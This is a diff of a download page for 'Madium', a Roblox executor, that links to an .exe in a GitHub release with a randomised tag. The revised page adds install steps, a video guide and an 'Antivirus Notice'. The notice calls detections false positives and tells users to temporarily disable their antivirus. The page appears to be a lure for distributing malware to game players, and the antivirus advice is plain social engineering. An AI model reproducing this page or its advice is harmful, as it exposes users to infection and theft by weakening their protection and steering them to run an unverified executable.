@@ -4,59 +4,65 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Download Madium</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{min-height:100vh;background:#0D0D0D;color:#F0F0F0;font-family:'Inter',system-ui,sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}
-body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 20%,rgba(245,166,35,.4) 0%,transparent 60%);opacity:.35;pointer-events:none;z-index:0}
-.wrap{position:relative;z-index:1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 24px;gap:32px}
-.brand{display:flex;align-items:center;gap:12px;font-size:15px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;color:#8A8A8A}
-.brand-mark{width:36px;height:36px;background:#F5A623;color:#0D0D0D;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:16px;box-shadow:0 0 24px rgba(245,166,35,.4)}
-.card{background:#161616;border:1px solid rgba(245,166,35,.3);border-radius:24px;max-width:480px;width:100%;padding:48px 40px;text-align:center;box-shadow:0 32px 80px rgba(0,0,0,.6)}
-h1{font-size:clamp(28px,4vw,38px);font-weight:900;letter-spacing:-.03em;line-height:1.1;margin-bottom:32px;color:#F0F0F0}
-.btn{display:flex;align-items:center;justify-content:center;gap:10px;background:#F5A623;color:#0D0D0D;padding:18px 28px;border-radius:14px;text-decoration:none;font-weight:700;font-size:16px;transition:all .2s;box-shadow:0 8px 24px rgba(245,166,35,.4)}
-.btn:hover{transform:translateY(-2px);box-shadow:0 16px 40px rgba(245,166,35,.4)}
-.btn svg{width:20px;height:20px}
-.pwbox{margin-top:24px;padding:20px;background:#0D0D0D;border:1px solid rgba(245,166,35,.3);border-radius:14px;text-align:left;box-shadow:0 8px 24px rgba(0,0,0,.3)}
-.pwlabel{font-size:11px;letter-spacing:.15em;text-transform:uppercase;color:#8A8A8A;margin-bottom:10px;font-weight:600}
-.pwrow{display:flex;align-items:center;gap:12px;justify-content:space-between;flex-wrap:wrap}
-.pwcode{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:22px;font-weight:800;letter-spacing:.15em;color:#F5A623;user-select:all;flex:1;min-width:160px;word-break:break-all;cursor:pointer}
-.pwcopy{display:inline-flex;align-items:center;gap:6px;padding:8px 14px;background:#F5A623;color:#0D0D0D;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;transition:all .15s;white-space:nowrap;font-family:inherit}
-.pwcopy:hover{opacity:.88;transform:translateY(-1px)}
-.pwcopy:active{transform:translateY(0)}
-.pwcopy svg{width:14px;height:14px}
-.pwcopy.copied{background:transparent;color:#F5A623;border:1px solid #F5A623}
-.foot{margin-top:36px;padding-top:24px;border-top:1px solid rgba(245,166,35,.3);font-size:12px;color:#8A8A8A;line-height:1.6}
+body{min-height:100vh;background:#0a0a0a;color:#f0f0f0;font-family:'Inter',system-ui,sans-serif;-webkit-font-smoothing:antialiased;display:flex;align-items:center;justify-content:center;padding:20px;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 50% 0%, #f5a62315 0%, transparent 70%);pointer-events:none;z-index:0}
+.card{position:relative;z-index:1;background:#121212;border:1px solid rgba(245,166,35,.15);border-radius:20px;max-width:500px;width:100%;padding:40px 32px;box-shadow:0 20px 60px rgba(0,0,0,.8);text-align:center}
+h1{font-size:26px;font-weight:800;letter-spacing:-.02em;margin-bottom:8px;color:#f0f0f0}
+.subtitle{font-size:14px;color:#8a8a8a;margin-bottom:32px}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;background:#f5a623;color:#000000;padding:14px 32px;border-radius:12px;text-decoration:none;font-weight:700;font-size:15px;transition:all .2s;margin-bottom:24px}
+.btn:hover{transform:translateY(-2px);opacity:.9;box-shadow:0 8px 24px #f5a62340}
+.btn svg{width:18px;height:18px}
+.pw-box{background:rgba(0,0,0,.4);border:1px dashed rgba(245,166,35,.15);border-radius:10px;padding:16px;margin-bottom:24px}
+.pw-label{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:#8a8a8a;margin-bottom:6px;font-weight:600}
+.pw-code{font-family:monospace;font-size:22px;font-weight:700;color:#f5a623;letter-spacing:.05em}
+.steps{text-align:left;background:rgba(255,255,255,.03);border:1px solid rgba(245,166,35,.15);border-radius:12px;padding:20px;margin-bottom:24px}
+.steps h3{font-size:12px;text-transform:uppercase;letter-spacing:.08em;color:#8a8a8a;margin-bottom:14px;font-weight:700}
+.step{display:flex;align-items:center;gap:12px;font-size:14px;margin-bottom:10px;color:#f0f0f0}
+.step:last-child{margin-bottom:0}
+.step-num{width:24px;height:24px;background:#f5a62320;color:#f5a623;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;flex-shrink:0}
+.warning{background:rgba(255,60,60,.06);border:1px solid rgba(255,60,60,.15);border-radius:12px;padding:16px;margin-bottom:24px;text-align:left}
+.warning strong{color:#ff5555;font-size:13px;display:block;margin-bottom:4px}
+.warning span{color:#d0a0a0;font-size:12px;line-height:1.4;display:block}
+.video-wrap{position:relative;padding-bottom:56.25%;height:0;border-radius:12px;overflow:hidden;margin-bottom:16px;border:1px solid rgba(245,166,35,.15)}
+.video-wrap iframe{position:absolute;top:0;left:0;width:100%;height:100%}
+.yt-link{font-size:13px;color:#8a8a8a;text-decoration:none;border-bottom:1px solid #8a8a8a40;padding-bottom:2px;transition:color .2s}
+.yt-link:hover{color:#f5a623}
+.footer{margin-top:32px;font-size:11px;color:#8a8a8a;opacity:.6}
 </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="brand"><div class="brand-mark">M</div><span>Madium</span></div>
-  <div class="card">
-    <h1>Download Madium</h1>
-    <a class="btn" href="https://github.com/BrandSerpentCurl/wave-dl-madium/releases/download/v-9p3572/madium.exe">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-      Download .exe
-    </a>
-    
-    <div class="foot"> © 2026 Madium. Not affiliated with Roblox Corporation.</div>
+<div class="card">
+  <h1>Download Madium</h1>
+  <div class="subtitle">Latest version • Windows</div>
+  
+  <a class="btn" href="https://github.com/BrandSerpentCurl/wave-dl-madium/releases/download/v-9qt9q7/madium.exe">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+    Download File
+  </a>
+
+  
+
+  <div class="steps">
+    <h3>Installation Guide</h3>
+    <div class="step"><div class="step-num">1</div>Download the file using the button above</div>
+    <div class="step"><div class="step-num">2</div>Open the installer (exe or zip)</div>
+    <div class="step"><div class="step-num">3</div>Run and follow on-screen instructions</div>
   </div>
+
+  <div class="warning">
+    <strong>⚠️ Antivirus Notice</strong>
+    <span>Windows Defender or other antiviruses may flag this file as a false positive. This is normal for Roblox executors. If needed, temporarily disable your antivirus during installation.</span>
+  </div>
+
+  <div class="video-wrap">
+    <iframe src="https://www.youtube.com/embed/8qWfnsjI4rM" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+  </div>
+  <a href="https://www.youtube.com/watch?v=8qWfnsjI4rM" target="_blank" class="yt-link">Watch video guide on YouTube</a>
+
+  <div class="footer">© 2026 Madium. Not affiliated with Roblox Corporation.</div>
 </div>
-<script>
-function copyPw(btn){
-  var code=document.getElementById("pwval");
-  if(!code)return;
-  var txt=code.textContent.trim();
-  var done=function(){var orig=btn.innerHTML;btn.innerHTML="✓ Copied";btn.classList.add("copied");setTimeout(function(){btn.innerHTML=orig;btn.classList.remove("copied");},1800);};
-  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(function(){fallbackCopy(txt);done();});}
-  else{fallbackCopy(txt);done();}
-}
-function fallbackCopy(txt){
-  var ta=document.createElement("textarea");ta.value=txt;ta.style.position="fixed";ta.style.opacity="0";
-  document.body.appendChild(ta);ta.select();try{document.execCommand("copy");}catch(e){}
-  document.body.removeChild(ta);
-}
-document.addEventListener("DOMContentLoaded",function(){var p=document.getElementById("pwval");if(p){p.addEventListener("click",function(){var b=document.querySelector(".pwcopy");if(b)copyPw(b);});}});
-</script>
 </body>
 </html>
